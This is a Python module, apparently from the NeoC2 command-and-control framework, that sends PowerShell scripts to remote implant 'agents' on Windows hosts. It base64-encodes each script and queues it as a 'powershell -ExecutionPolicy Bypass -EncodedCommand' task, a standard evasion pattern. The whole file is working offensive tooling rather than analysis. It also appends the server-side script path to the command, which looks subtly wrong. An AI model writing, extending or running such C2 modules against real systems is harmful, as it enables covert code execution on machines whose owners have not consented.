import os
import importlib.util
import base64
import re

def get_info():
    return {
        "name": "pwsh",
        "description": "Execute PowerShell scripts on agents by uploading and executing them",
        "type": "execution",
        "platform": "windows",
        "author": "NeoC2 Framework by @stillbigjosh",
        "references": [
            "https://github.com/stillbigjosh/NeoC2"
        ],
        "technique_id": "T1059",  # Command and Scripting Interpreter
        "mitre_tactics": ["Execution"],
        "options": {
            "agent_id": {
                "description": "ID of the agent to run PowerShell script on",
                "required": True
            },
            "script_path": {
                "description": "Path to the PowerShell script to execute on Neo C2 server.",
                "required": True
            },
            "arguments": {
                "description": "Arguments to pass to the PowerShell script",
                "required": False,
                "default": ""
            }
        }
    }


def execute(options, session):
    agent_id = options.get("agent_id")
    script_path = options.get("script_path")
    script_args = options.get("arguments", "")

    if not agent_id:
        return {
            "success": False,
            "error": "agent_id is required"
        }

    if not script_path:
        return {
            "success": False,
            "error": "PowerShell script path is required"
        }

    session.current_agent = agent_id

    try:
        with open(script_path, 'r', encoding='utf-8') as f:
            original_script = f.read()
    except FileNotFoundError:
        return {
            "success": False,
            "error": f"PowerShell script file not found: {script_path}"
        }
    except Exception as e:
        return {
            "success": False,
            "error": f"Error reading PowerShell script: {str(e)}"
        }

    import base64
    script_cmd = f"{original_script}; & '{script_path}'"
    if script_args:
        script_cmd += f" {script_args}"

    encoded_cmd = base64.b64encode(script_cmd.encode('utf-16le')).decode('ascii')
    command = f"powershell -ExecutionPolicy Bypass -EncodedCommand {encoded_cmd}"

    if not hasattr(session, 'agent_manager') or session.agent_manager is None:
        return {
            "success": False,
            "error": "Session does not have an initialized agent_manager"
        }

    try:
        agent_manager = session.agent_manager
        task_result = agent_manager.add_task(agent_id, command)
        if task_result.get('success'):
            task_id = task_result['task_id']
            return {
                "success": True,
                "output": f"[x] PowerShell script execution task {task_id} queued for agent {agent_id}",
                "task_id": task_id,
                "command": command
            }
        else:
            return {
                "success": False,
                "error": f"Failed to queue task for agent {agent_id}: {task_result.get('error', 'Unknown error')}"
            }
    except Exception as e:
        return {
            "success": False,
            "error": f"Error queuing task: {str(e)}"
        }
